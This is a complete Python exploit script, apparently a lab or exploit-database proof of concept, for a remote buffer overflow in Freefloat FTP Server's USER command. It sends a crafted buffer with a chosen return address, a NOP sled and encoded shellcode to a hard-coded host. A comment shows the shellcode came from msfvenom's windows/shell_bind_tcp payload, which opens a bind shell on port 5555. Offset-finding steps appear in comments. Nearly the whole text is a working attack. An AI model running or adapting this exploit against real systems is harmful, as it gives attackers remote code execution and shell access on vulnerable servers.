######################################################
# Freefloat FTP Server - 'USER' Remote Buffer Overflow
# Demo: https://www.youtube.com/watch?v=Ko7qaF8scTY
######################################################

#!/usr/bin/python
import sys, socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.50.5',21))

#./pattern_offset.rb -q 37684136
#[*] Exact match at offset 230 
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

buffer = "A" * 230

# EIP @ 230
buffer += "\x53\x93\x42\x7e"

# Misc
buffer += "C" * 8

# NOP Sled
buffer += "\x90" * 30

# ESP @ 242
#./pattern_offset.rb -q 0Ai1
#[*] Exact match at offset 242
# 230 + 4 + 8 = 242
#buffer += "D" * 4
buffer += ("\xdb\xd4\xd9\x74\x24\xf4\x58\x31\xc9\xba\x91\x85\x4d\x11\xb1"
"\x53\x83\xc0\x04\x31\x50\x13\x03\xc1\x96\xaf\xe4\x1d\x70\xad"
"\x07\xdd\x81\xd2\x8e\x38\xb0\xd2\xf5\x49\xe3\xe2\x7e\x1f\x08"
"\x88\xd3\x8b\x9b\xfc\xfb\xbc\x2c\x4a\xda\xf3\xad\xe7\x1e\x92"
"\x2d\xfa\x72\x74\x0f\x35\x87\x75\x48\x28\x6a\x27\x01\x26\xd9"
"\xd7\x26\x72\xe2\x5c\x74\x92\x62\x81\xcd\x95\x43\x14\x45\xcc"
"\x43\x97\x8a\x64\xca\x8f\xcf\x41\x84\x24\x3b\x3d\x17\xec\x75"
"\xbe\xb4\xd1\xb9\x4d\xc4\x16\x7d\xae\xb3\x6e\x7d\x53\xc4\xb5"
"\xff\x8f\x41\x2d\xa7\x44\xf1\x89\x59\x88\x64\x5a\x55\x65\xe2"
"\x04\x7a\x78\x27\x3f\x86\xf1\xc6\xef\x0e\x41\xed\x2b\x4a\x11"
"\x8c\x6a\x36\xf4\xb1\x6c\x99\xa9\x17\xe7\x34\xbd\x25\xaa\x50"
"\x72\x04\x54\xa1\x1c\x1f\x27\x93\x83\x8b\xaf\x9f\x4c\x12\x28"
"\xdf\x66\xe2\xa6\x1e\x89\x13\xef\xe4\xdd\x43\x87\xcd\x5d\x08"
"\x57\xf1\x8b\xa5\x5f\x54\x64\xd8\xa2\x26\xd4\x5c\x0c\xcf\x3e"
"\x53\x73\xef\x40\xb9\x1c\x98\xbc\x42\x37\xea\x48\xa4\x5d\x1c"
"\x1d\x7e\xc9\xde\x7a\xb7\x6e\x20\xa9\xef\x18\x69\xbb\x28\x27"
"\x6a\xe9\x1e\xbf\xe1\xfe\x9a\xde\xf5\x2a\x8b\xb7\x62\xa0\x5a"
"\xfa\x13\xb5\x76\x6c\xb7\x24\x1d\x6c\xbe\x54\x8a\x3b\x97\xab"
"\xc3\xa9\x05\x95\x7d\xcf\xd7\x43\x45\x4b\x0c\xb0\x48\x52\xc1"
"\x8c\x6e\x44\x1f\x0c\x2b\x30\xcf\x5b\xe5\xee\xa9\x35\x47\x58"
"\x60\xe9\x01\x0c\xf5\xc1\x91\x4a\xfa\x0f\x64\xb2\x4b\xe6\x31"
"\xcd\x64\x6e\xb6\xb6\x98\x0e\x39\x6d\x19\x3e\x70\x2f\x08\xd7"
"\xdd\xba\x08\xba\xdd\x11\x4e\xc3\x5d\x93\x2f\x30\x7d\xd6\x2a"
"\x7c\x39\x0b\x47\xed\xac\x2b\xf4\x0e\xe5")

s.recv(1024)
s.send("USER " + buffer + "\r\n")
s.close()
sys.exit()

"""
./pattern_create.rb -l 300

# EIP
./pattern_offset.rb -q xxxxxxxx

# ESP
./pattern_offset.rb -q xxxx
"""

# bundle exec msfvenom -p windows/shell_bind_tcp LPORT=5555 -b '\x00\x0a\x0d' -f c

